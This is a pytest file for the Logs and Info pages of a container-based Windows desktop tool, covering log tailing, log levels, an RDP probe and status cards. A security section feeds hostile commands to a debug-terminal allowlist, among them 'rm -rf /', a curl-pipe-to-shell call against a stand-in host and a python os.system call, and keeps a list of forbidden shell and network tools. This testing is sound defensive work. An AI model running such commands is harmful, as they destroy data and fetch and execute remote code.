    )
    assert not answer.timed_out
    assert answer.button_texts == ["Cancel", "Proceed"]
    assert result is True


def test_confirm_with_callout_cancel_button_refuses(maint):
    answer = _ModalAnswer(button_index=0).arm()
    result = _confirm_with_callout(maint, "Title", "Body", "Callout")
    assert not answer.timed_out
    assert result is False


# ----- Logs page (LogsMixin) --------------------------------------------


class _LogsHarness(LogsMixin):
    """Bare host exposing what LogsMixin reads (no QWidget parenting needed)."""

    def __init__(self, cfg: Config) -> None:
        self.cfg = cfg
        self.log_signal = _FakeSignal()
        self.ran = []
        self.page = None

    def build_page(self):
        """Build + retain the Logs page (an unparented QWidget would be GC'd)."""
        self.page = self._build_logs_page()
        return self.page


class _RecordingLogsHarness(_LogsHarness):
    """Same, but records what would have been executed instead of running it."""

    def _run_log_cmd(self, cmd) -> None:
        self.ran.append(list(cmd))


class _FakeStdout:
    def __init__(self, lines, error=None) -> None:
        self._lines = list(lines)
        self._error = error

    def readline(self):
        if self._error is not None:
            raise self._error
        if self._lines:
            return self._lines.pop(0)
        return ""


class _FakeProc:
    """Stand-in for a ``subprocess.Popen`` tail process."""

    def __init__(self, lines=(), readline_error=None, terminate_error=None) -> None:
        self.stdout = _FakeStdout(lines, readline_error)
        self.stderr = None
        self.terminate_error = terminate_error
        self.terminated = 0
        self.killed = 0
        self.waited = 0

    def terminate(self) -> None:
        self.terminated += 1
        if self.terminate_error is not None:
            raise self.terminate_error

    def wait(self, timeout=None) -> int:
        self.waited += 1
        return 0

    def kill(self) -> None:
        self.killed += 1


class _PopenRecorder:
    """Captures the argv of every tail process the Logs tab would spawn."""

    def __init__(self, lines=()) -> None:
        self.argvs = []
        self.procs = []
        self.lines = lines
        self.error = None

    def __call__(self, argv, **_kwargs):
        self.argvs.append(list(argv))
        if self.error is not None:
            raise self.error
        proc = _FakeProc(self.lines)
        self.procs.append(proc)
        return proc


@pytest.fixture
def popen(monkeypatch):
    """Stub ``subprocess.Popen`` for the tail helpers.

    ``_on_follow_*`` / ``_start_raw_pod_tail`` import ``subprocess`` inside
    the function body, so there is no module-level alias to patch — the
    module object's attribute is the only lookup site (same approach as
    ``test_main_window_bringup.py``'s ``subprocess.run`` stub).
    """
    rec = _PopenRecorder()
    monkeypatch.setattr(subprocess, "Popen", rec)
    return rec


@pytest.fixture
def logs():
    return _LogsHarness(_cfg())


def test_build_logs_page_wires_the_terminal_widgets(logs):
    page = logs.build_page()
    assert isinstance(logs.log_output, QTextEdit)
    assert logs.log_output.isReadOnly()
    assert logs.log_output.lineWrapMode() == QTextEdit.LineWrapMode.NoWrap
    assert logs.log_output.minimumWidth() > 0
    assert "winpodx-windows" in logs.cmd_input.placeholderText()

    combo = page.findChildren(QComboBox)[0]
    assert combo is logs.input_log_level
    levels = [combo.itemData(i) for i in range(combo.count())]
    assert levels == ["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL", "RAW"]
    assert combo.currentData() == "INFO"  # mirrors cfg.logging.level

    labels = [b.text() for b in page.findChildren(QPushButton)]
    assert labels == [
        "Status",
        "Pod logs",
        "App log",
        "Inspect",
        "RDP Test",
        "Clear",
        "Run",
    ]


def test_clear_button_empties_the_terminal(logs):
    page = logs.build_page()
    logs._log_append("noise")
    assert logs.log_output.toPlainText()
    clear = [b for b in page.findChildren(QPushButton) if b.text() == "Clear"][0]
    clear.click()
    assert logs.log_output.toPlainText() == ""


def test_log_append_escapes_markup(logs):
    logs.build_page()
    logs._log_append("<b>podman</b> & <script>alert(1)</script>")
    plain = logs.log_output.toPlainText()
    # Escaped, so the literal tags survive to the plain text. Without the
    # html.escape() they would be swallowed as markup and only "podman"
    # would remain.
    assert "<b>podman</b>" in plain
    assert "<script>alert(1)</script>" in plain


# ----- Logs: the Terminal-tab command allowlist (SECURITY) --------------


@pytest.mark.parametrize(
    "text",
    [
        "rm -rf /",
        "sh -c 'curl evil.sh | sh'",
        "bash",
        "python3 -c 'import os; os.system(\"id\")'",
        "sudo podman ps",
        "env podman ps",
        "/bin/podman ps",
        "echo podman",
        "./podman",
    ],
)
def test_terminal_refuses_non_allowlisted_commands(text):
    """The debug terminal must never exec anything outside the allowlist."""
    harness = _RecordingLogsHarness(_cfg())
    harness.build_page()
    harness.cmd_input.setText(text)
    harness._on_cmd_enter()

    assert harness.ran == [], f"{text!r} reached exec — allowlist bypassed"
    assert "Blocked: this is a debug terminal" in harness.log_output.toPlainText()
    assert harness.cmd_input.text() == ""


def test_terminal_runs_an_allowlisted_command():
    harness = _RecordingLogsHarness(_cfg())
    harness.build_page()
    harness.cmd_input.setText("  podman logs --tail 5 winpodx-windows  ")
    harness._on_cmd_enter()
    assert harness.ran == [["podman", "logs", "--tail", "5", "winpodx-windows"]]
    assert "Blocked" not in harness.log_output.toPlainText()


def test_allowlist_contains_no_general_shell_or_interpreter():
    """Regression guard: the allowlist must stay a narrow diagnostic set."""
    forbidden = {
        "sh",
        "bash",
        "zsh",
        "dash",
        "env",
        "sudo",
        "su",
        "python",
        "python3",
        "perl",
        "curl",
        "wget",
        "rm",
        "dd",
        "chmod",
        "eval",
        "nc",
        "xargs",
    }
    assert LogsMixin._ALLOWED_COMMANDS.isdisjoint(forbidden)
    # Every entry is a bare binary name, never a path or a shell fragment.
    for name in LogsMixin._ALLOWED_COMMANDS:
        assert "/" not in name and " " not in name


def test_terminal_reports_a_parse_error():
    harness = _RecordingLogsHarness(_cfg())
    harness.build_page()
    harness.cmd_input.setText("podman 'unterminated")
    harness._on_cmd_enter()
    assert harness.ran == []
    assert "Parse error" in harness.log_output.toPlainText()


def test_terminal_ignores_an_empty_line():
    harness = _RecordingLogsHarness(_cfg())
    harness.build_page()
    harness.cmd_input.setText("   ")
    harness._on_cmd_enter()
    assert harness.ran == []
    assert harness.log_output.toPlainText() == ""


# ----- Logs: running a command ------------------------------------------


class _FakeRun:
    def __init__(self, stdout="", stderr="", returncode=0) -> None:
        self.stdout = stdout
        self.stderr = stderr
        self.returncode = returncode


def test_run_log_cmd_streams_stdout_stderr_and_rc(logs, monkeypatch):
    monkeypatch.setattr(
        subprocess,
        "run",
        lambda *_a, **_k: _FakeRun(stdout="CONTAINER\n", stderr="warn!\n", returncode=3),
    )
    logs.build_page()
    logs._run_log_cmd(["podman", "ps"])
    assert _wait_for(lambda: len(logs.log_signal.emissions) >= 3)
    texts = logs.log_signal.texts()
    assert "CONTAINER" in texts
    assert "warn!" in texts
    assert "Exit code: 3" in texts
    assert "$ podman ps" in logs.log_output.toPlainText()


def test_run_log_cmd_reports_a_timeout(logs, monkeypatch):
    def _boom(*_a, **_k):
        raise subprocess.TimeoutExpired(cmd="podman", timeout=30)

    monkeypatch.setattr(subprocess, "run", _boom)
    logs.build_page()
    logs._run_log_cmd(["podman", "ps"])
    assert _wait_for(lambda: logs.log_signal.emissions)
    assert logs.log_signal.texts() == ["Command timed out (30s)"]


def test_run_log_cmd_reports_a_missing_binary(logs, monkeypatch):
    def _boom(*_a, **_k):
        raise FileNotFoundError("docker")

    monkeypatch.setattr(subprocess, "run", _boom)
    logs.build_page()
    logs._run_log_cmd(["docker", "ps"])
    assert _wait_for(lambda: logs.log_signal.emissions)
    assert logs.log_signal.texts() == ["Command not found: docker"]


# ----- Logs: app-log tailing --------------------------------------------


def _write_app_log(lines):
    from winpodx.utils.paths import config_dir

    path = config_dir() / "winpodx.log"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return path


def test_tail_app_log_shows_only_the_last_200_lines(logs):
    _write_app_log([f"line-{i:04d}" for i in range(1, 301)])
    logs.build_page()
    logs._on_tail_app_log()
    plain = logs.log_output.toPlainText()
    assert "line-0300" in plain
    assert "line-0101" in plain
    assert "line-0100" not in plain


def test_tail_app_log_handles_a_missing_file(logs):
    logs.build_page()
    logs._on_tail_app_log()
    assert "no app log file yet" in logs.log_output.toPlainText()


def test_tail_app_log_handles_a_read_error(logs):
    from winpodx.utils.paths import config_dir

    # A directory where the log file should be: exists(), but read_text raises.
    (config_dir() / "winpodx.log").mkdir(parents=True, exist_ok=True)
    logs.build_page()
    logs._on_tail_app_log()
    assert "Could not read app log" in logs.log_output.toPlainText()


def test_follow_app_log_creates_the_file_and_tails_it(logs, popen):
    from winpodx.utils.paths import config_dir

    logs.build_page()
    logs._on_follow_app_log()
    log_path = config_dir() / "winpodx.log"
    assert log_path.exists()
    assert popen.argvs == [["tail", "-F", "-n", "50", str(log_path)]]
    assert logs._tail_proc is popen.procs[0]


def test_follow_app_log_reports_a_spawn_failure(logs, popen):
    popen.error = FileNotFoundError("tail")
    logs.build_page()
    logs._on_follow_app_log()
    assert "Could not start tail" in logs.log_output.toPlainText()


def test_follow_pod_log_uses_the_configured_backend(popen):
    harness = _LogsHarness(_cfg(backend="docker", container_name="my-win"))
    harness.build_page()
    harness._on_follow_pod_log()
    assert popen.argvs == [["docker", "logs", "-f", "--tail", "50", "my-win"]]


def test_follow_pod_log_reports_a_spawn_failure(logs, popen):
    popen.error = OSError("no podman")
    logs.build_page()
    logs._on_follow_pod_log()
    assert "Could not start tail" in logs.log_output.toPlainText()
    # A failed spawn must not arm the drain thread's stop event.
    assert getattr(logs, "_tail_stop", None) is None


# ----- Logs: tail drain / stop lifecycle --------------------------------


def test_drain_tail_emits_every_nonblank_line(logs):
    proc = _FakeProc(["first\n", "\n", "second  \n"])
    logs._tail_stop = threading.Event()
    logs._drain_tail(proc)
    assert logs.log_signal.texts() == ["first", "second"]
    assert proc.terminated == 1 and proc.waited == 1


def test_drain_tail_stops_on_the_stop_event(logs):
    proc = _FakeProc(["first\n", "second\n"])
    logs._tail_stop = threading.Event()
    logs._tail_stop.set()
    logs._drain_tail(proc)
    assert logs.log_signal.emissions == []
    assert proc.terminated == 1


def test_drain_tail_survives_a_reader_crash(logs):
    proc = _FakeProc(readline_error=OSError("pipe broke"))
    logs._tail_stop = threading.Event()
    logs._drain_tail(proc)  # must not raise
    assert proc.terminated == 1


def test_drain_tail_kills_when_terminate_refuses(logs):
    proc = _FakeProc(terminate_error=OSError("no such process"))
    logs._tail_stop = threading.Event()
    logs._drain_tail(proc)
    assert proc.killed == 1


def test_stop_tail_is_a_noop_without_a_live_tail(logs):
    logs.build_page()
    logs._on_stop_tail()
    assert logs.log_output.toPlainText() == ""


def test_stop_tail_terminates_and_clears_the_handle(logs):
    logs.build_page()
    proc = _FakeProc()
    logs._tail_proc = proc
    logs._tail_stop = threading.Event()
    logs._on_stop_tail()
    assert logs._tail_stop.is_set()
    assert proc.terminated == 1
    assert logs._tail_proc is None
    assert "(tail stopped)" in logs.log_output.toPlainText()


def test_stop_tail_kills_when_terminate_refuses(logs):
    logs.build_page()
    proc = _FakeProc(terminate_error=OSError("gone"))
    logs._tail_proc = proc
    logs._tail_stop = threading.Event()
    logs._on_stop_tail()
    assert proc.killed == 1
    assert logs._tail_proc is None


# ----- Logs: RAW pod tail ------------------------------------------------


def test_start_raw_pod_tail_spawns_and_is_idempotent(logs, popen):
    logs.build_page()
    logs._start_raw_pod_tail()
    assert popen.argvs == [["podman", "logs", "-f", "--tail", "20", "winpodx-windows"]]
    logs._start_raw_pod_tail()  # already running -> no second spawn
    assert len(popen.argvs) == 1


def test_start_raw_pod_tail_degrades_when_podman_is_missing(logs, popen):
    popen.error = FileNotFoundError("podman")
    logs.build_page()
    logs._start_raw_pod_tail()
    assert "[RAW] pod tail unavailable" in logs.log_output.toPlainText()
    assert logs._tail_proc_raw is None


def test_drain_raw_pod_tail_prefixes_each_line(logs):
    proc = _FakeProc(["BdsDxe: boot\n", "\n", "Sysprep done\n"])
    logs._tail_stop_raw = threading.Event()
    logs._drain_raw_pod_tail(proc)
    assert logs.log_signal.texts() == ["[pod] BdsDxe: boot", "[pod] Sysprep done"]
    assert proc.terminated == 1


def test_drain_raw_pod_tail_honours_its_own_stop_event(logs):
    proc = _FakeProc(["line\n"])
    logs._tail_stop_raw = threading.Event()
    logs._tail_stop_raw.set()
    logs._drain_raw_pod_tail(proc)
    assert logs.log_signal.emissions == []


def test_stop_raw_pod_tail_noop_then_stop(logs):
    logs.build_page()
    logs._stop_raw_pod_tail()  # nothing running
    assert logs.log_output.toPlainText() == ""
    proc = _FakeProc()
    logs._tail_proc_raw = proc
    logs._tail_stop_raw = threading.Event()
    logs._stop_raw_pod_tail()
    assert proc.terminated == 1
    assert logs._tail_proc_raw is None
    assert "[RAW] pod tail stopped" in logs.log_output.toPlainText()


# ----- Logs: log-level dropdown -----------------------------------------


@pytest.fixture
def setup_logging_calls(monkeypatch):
    """Record setup_logging() instead of reconfiguring the real logger."""
    calls = []
    monkeypatch.setattr(
        "winpodx.utils.logging.setup_logging", lambda level=None, log_file=True: calls.append(level)
    )
    return calls


def _select_level(harness, value):
    combo = harness.input_log_level
    combo.setCurrentIndex(combo.findData(value))


def test_log_level_change_persists_and_reapplies(logs, setup_logging_calls):
    logs.build_page()
    _select_level(logs, "DEBUG")
    assert logs.cfg.logging.level == "DEBUG"
    assert setup_logging_calls == [10]
    assert "Log level set to DEBUG" in logs.log_output.toPlainText()
    # Persisted, so the next CLI / GUI run honours it.
    assert Config.load().logging.level == "DEBUG"


def test_log_level_change_to_same_value_is_a_noop(logs, setup_logging_calls):
    logs.build_page()
    _select_level(logs, "INFO")  # already INFO
    assert setup_logging_calls == []


def test_log_level_change_reports_a_persist_failure(logs, setup_logging_calls, monkeypatch):
    logs.build_page()

    def _boom(self):
        raise OSError("read-only config dir")

    monkeypatch.setattr(Config, "save", _boom)
    _select_level(logs, "ERROR")
    assert "Could not persist log level" in logs.log_output.toPlainText()
    assert setup_logging_calls == []


def test_log_level_change_reports_a_logger_failure(logs, monkeypatch):
    logs.build_page()

    def _boom(level=None, log_file=True):
        raise RuntimeError("handler blew up")

    monkeypatch.setattr("winpodx.utils.logging.setup_logging", _boom)
    _select_level(logs, "WARNING")
    assert "Could not update logger" in logs.log_output.toPlainText()


def test_raw_level_starts_and_stops_the_auxiliary_pod_tail(logs, setup_logging_calls, monkeypatch):
    logs.build_page()
    events = []
    monkeypatch.setattr(logs, "_start_raw_pod_tail", lambda: events.append("start"))
    monkeypatch.setattr(logs, "_stop_raw_pod_tail", lambda: events.append("stop"))

    _select_level(logs, "RAW")
    assert logs.cfg.logging.is_raw()
    assert events == ["start"]

    _select_level(logs, "INFO")
    assert events == ["start", "stop"]


# ----- Logs: RDP probe ---------------------------------------------------


def test_rdp_test_reports_a_reachable_port(logs, load_cfg, monkeypatch):
    cfg = load_cfg(_cfg())
    cfg.rdp.ip = "127.0.0.1"
    cfg.rdp.port = 3390
    monkeypatch.setattr("winpodx.core.pod.check_rdp_port", lambda _ip, _port, timeout=5: True)
    logs.build_page()
    logs._on_rdp_test()
    assert _wait_for(lambda: logs.log_signal.emissions)
    assert logs.log_signal.texts() == ["RDP OK: 127.0.0.1:3390"]


def test_rdp_test_reports_an_unreachable_port(logs, load_cfg, monkeypatch):
    cfg = load_cfg(_cfg())
    cfg.rdp.ip = "127.0.0.1"
    cfg.rdp.port = 3390
    monkeypatch.setattr("winpodx.core.pod.check_rdp_port", lambda _ip, _port, timeout=5: False)
    logs.build_page()
    logs._on_rdp_test()
    assert _wait_for(lambda: logs.log_signal.emissions)
    assert logs.log_signal.texts() == ["RDP FAIL: 127.0.0.1:3390"]


# ----- Info page (InfoPageMixin) ----------------------------------------


_SNAPSHOT = {
    "health": [
        {"name": "agent_health", "status": "ok", "detail": "agent replied", "duration_ms": 12},
        {"name": "disk_free", "status": "warn", "detail": "6 GiB left", "duration_ms": 3},
        {"name": "guest_exec", "status": "fail", "detail": "pod down", "duration_ms": 41},
    ],
    "health_overall": "warn",
    "system": {
        "winpodx": "0.10.4",
        "oem_bundle": "v9",
        "rdprrap": "0.3.0",
        "distro": "openSUSE Tumbleweed",
        "kernel": "6.14.0",
    },
    "display": {
        "session_type": "wayland",
        "desktop_environment": "KDE",
        "wayland_freerdp": "yes",
        "raw_scale": "150",
        "rdp_scale": "140",
    },
    "dependencies": {
        "freerdp": {"found": "true", "path": "/usr/bin/xfreerdp3"},
        "podman": {"found": "false", "path": ""},
        "mystery": {"found": "false", "path": ""},
    },
    "pod": {
        "state": "running",
        "uptime": "2026-08-12T09:00:00",
        "rdp_port": 3390,
        "rdp_reachable": True,
        "vnc_port": 8006,
        "vnc_reachable": False,
        "active_sessions": 2,
    },
    "config": {
        "path": "/tmp/winpodx.toml",
        "backend": "podman",
        "ip": "127.0.0.1",
        "port": 3390,
        "user": "WPX-User",
        "scale": 140,
        "idle_timeout": 300,
        "max_sessions": 10,
        "ram_gb": 8,
        "budget_warning": "RAM budget exceeds host memory",
    },
}


class _FakeInfoWorker(QObject):
    """Emits a canned gather_info snapshot instead of probing the host."""

    done = Signal(dict)
    failed = Signal(str)

    snapshot: dict = {}

    def __init__(self, cfg) -> None:
        super().__init__()
        self.cfg = cfg

    @Slot()
    def run(self) -> None:
        self.done.emit(dict(type(self).snapshot))


class _StalledInfoWorker(_FakeInfoWorker):
    """Never finishes — used to exercise the refresh reentrancy guard."""

    @Slot()
    def run(self) -> None:
        return


class _InfoHarness(InfoPageMixin, QWidget):
    """Bare host exposing what InfoPageMixin reads."""

    def __init__(self, cfg: Config) -> None:
        super().__init__()
        self.cfg = cfg
        self.page = None

    def build_page(self):
        """Build + retain the Info page (an unparented QWidget would be GC'd)."""
        self.page = self._build_info_page()
        self.drain()
        return self.page

    def drain(self) -> None:
        """Settle every deferred Qt callback this harness owns.

        ``_build_info_page`` queues ``QTimer.singleShot(0, self._refresh_info)``
        and ``_refresh_info`` starts a real QThread. Leaving either pending
        lets a later test's ``processEvents()`` run them against a
        half-collected harness, which aborts the interpreter.
        """
        app = QApplication.instance()
        self._stop_info_auto_refresh()
        for _ in range(5):
            app.processEvents()
        thread = self.__dict__.pop("_info_thread", None)
        if thread is not None:
            try:
                thread.quit()
                thread.wait(2000)
            except RuntimeError:
                pass
        self._info_busy = False
        for _ in range(5):
            app.processEvents()


@pytest.fixture
def info(monkeypatch):
    """An Info-page harness whose worker never touches the real host."""
    monkeypatch.setattr("winpodx.gui._main_window_info.InfoWorker", _StalledInfoWorker)
    harness = _InfoHarness(_cfg())
    yield harness
    harness.drain()


def _rows(harness, key):
    """The (label, value) text pairs currently rendered in an info card."""
    body = harness._info_card_bodies[key]
    out = []
    for i in range(body.count()):
        widget = body.itemAt(i).widget()
        if widget is None:
            continue
        labels = widget.findChildren(QLabel)
        if len(labels) >= 2:
            out.append((labels[0].text(), labels[-1].text()))
    return out


def _health_rows(harness):
    body = harness._info_card_bodies["health"]
    out = []
    for i in range(body.count()):
        widget = body.itemAt(i).widget()
        if widget is None:
            continue
        out.append([lbl.text() for lbl in widget.findChildren(QLabel)])
    return out


def test_build_info_page_creates_all_six_cards(info):
    info.build_page()
    expected = ["health", "system", "display", "dependencies", "pod", "config"]
    assert list(info._info_cards) == expected
    assert sorted(info._info_card_bodies) == sorted(expected)
    for key in expected:
        assert info._info_card_bodies[key].count() == 1  # the "Loading..." panel
    titles = {lbl.text() for lbl in info._info_cards["pod"].findChildren(QLabel)}
    assert "Pod" in titles


def test_info_card_falls_back_to_the_default_icon(info):
    info._info_card_bodies = {}
    card = info._info_card("Mystery", "not-a-known-section")
    assert isinstance(card, QFrame)
    assert "mystery" in info._info_card_bodies


def test_apply_info_snapshot_renders_system_and_display(info):
    info.build_page()
    info._apply_info_snapshot(_SNAPSHOT)
    assert _rows(info, "system") == [
        ("WinPodX", "0.10.4"),
        ("OEM bundle", "v9"),
        ("rdprrap", "0.3.0"),
        ("Distro", "openSUSE Tumbleweed"),
        ("Kernel", "6.14.0"),
    ]
    assert ("Session type", "wayland") in _rows(info, "display")
    assert ("RDP scale", "140") in _rows(info, "display")


def test_apply_info_snapshot_annotates_missing_dependencies(info):
    info.build_page()
    info._apply_info_snapshot(_SNAPSHOT)
    deps = dict(_rows(info, "dependencies"))
    assert deps["freerdp"] == "OK /usr/bin/xfreerdp3"
    # A known missing dep gets the plain install hint appended...
    assert deps["podman"].startswith("MISSING")
    assert "Podman 4+" in deps["podman"]
    # ...and an unknown one is still reported, just without a hint.
    assert deps["mystery"] == "MISSING"


def test_apply_info_snapshot_renders_pod_rows(info):
    info.build_page()
    info._apply_info_snapshot(_SNAPSHOT)
    pod = dict(_rows(info, "pod"))
    assert pod["State"] == "running"
    assert pod["Started at"] == "2026-08-12T09:00:00"
    assert pod["RDP 3390"] == "port open"
    assert pod["VNC 8006"] == "port closed"
    assert pod["Active sessions"] == "2"
    assert "Port open ≠ Windows ready" in pod["Note"]


def test_apply_info_snapshot_omits_uptime_when_absent(info):
    info.build_page()
    snapshot = dict(_SNAPSHOT)
    snapshot["pod"] = dict(_SNAPSHOT["pod"], uptime="")
    info._apply_info_snapshot(snapshot)
    assert "Started at" not in dict(_rows(info, "pod"))


def test_apply_info_snapshot_renders_config_and_budget_warning(info):
    info.build_page()
    info._apply_info_snapshot(_SNAPSHOT)
    conf = dict(_rows(info, "config"))
    assert conf["IP"] == "127.0.0.1:3390"
    assert conf["Scale"] == "140%"
    assert conf["Idle"] == "300s"
    assert conf["Max sessions"] == "10"
    assert "RAM budget exceeds host memory" in conf["WARNING"]
    assert "(adjust in Settings)" in conf["WARNING"]


def test_apply_info_snapshot_hides_the_warning_row_when_clean(info):
    info.build_page()
    snapshot = dict(_SNAPSHOT)
    snapshot["config"] = dict(_SNAPSHOT["config"], budget_warning="")
    info._apply_info_snapshot(snapshot)
    assert "WARNING" not in dict(_rows(info, "config"))


def test_render_health_card_shows_a_badge_per_probe(info):
    info.build_page()
    info._apply_info_snapshot(_SNAPSHOT)
    rows = _health_rows(info)
    # First row is the overall verdict (an untitled dot + the summary).
    assert rows[0][-1] == "Overall: WARN"
    probes = rows[1:]
    assert [r[0] for r in probes] == ["OK", "WARN", "FAIL"]
    assert [r[1] for r in probes] == ["agent_health", "disk_free", "guest_exec"]
    assert probes[0][2] == "agent replied"
    assert probes[2][3] == "41ms"


def test_render_health_card_handles_no_probes(info):
    info.build_page()
    info._render_health_card([], "")
    body = info._info_card_bodies["health"]
    assert body.count() == 1
    text = " ".join(lbl.text() for lbl in body.itemAt(0).widget().findChildren(QLabel))
    assert "No probes ran" in text


def test_render_health_card_replaces_previous_rows(info):
    info.build_page()
    info._apply_info_snapshot(_SNAPSHOT)
    assert len(_health_rows(info)) == 4
    info._render_health_card(
        [{"name": "only", "status": "ok", "detail": "fine", "duration_ms": 1}], "ok"
    )
    rows = _health_rows(info)
    assert len(rows) == 2
    assert rows[1][1] == "only"


def test_card_helpers_ignore_an_unknown_key(info):
    info.build_page()
    info._set_info_card_rows("nope", [("a", "b")])  # must not raise
    info._info_card_bodies.pop("health")
    info._render_health_card(_SNAPSHOT["health"], "ok")  # must not raise


def test_refresh_info_guards_against_reentrancy(info):
    info.build_page()
    info._refresh_info()
    assert info._info_busy is True
    thread = info._info_thread
    info._refresh_info()  # ignored while the first worker is in flight
    assert info._info_thread is thread

    info._on_info_done()
    assert info._info_busy is False


def test_refresh_info_populates_the_cards_when_the_worker_returns(monkeypatch, qapp):
    _FakeInfoWorker.snapshot = _SNAPSHOT
    monkeypatch.setattr("winpodx.gui._main_window_info.InfoWorker", _FakeInfoWorker)
    harness = _InfoHarness(_cfg())
    try:
        harness.build_page()
        harness._refresh_info()

        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline and harness._info_busy:
            qapp.processEvents()
            time.sleep(0.002)
        qapp.processEvents()

        assert harness._info_busy is False, "info worker never reported back"
        assert dict(_rows(harness, "system"))["WinPodX"] == "0.10.4"
        assert _health_rows(harness)[0][-1] == "Overall: WARN"
    finally:
        harness.drain()


def test_info_auto_refresh_timer_starts_and_stops(info):
    info.build_page()
    info._start_info_auto_refresh()
    timer = info._info_auto_timer
    assert timer.isActive()
    assert timer.interval() == 30000
    info._stop_info_auto_refresh()
    assert not timer.isActive()
    info._on_info_done()


def test_stop_info_auto_refresh_without_a_timer_is_safe(info):
    info._stop_info_auto_refresh()  # must not raise
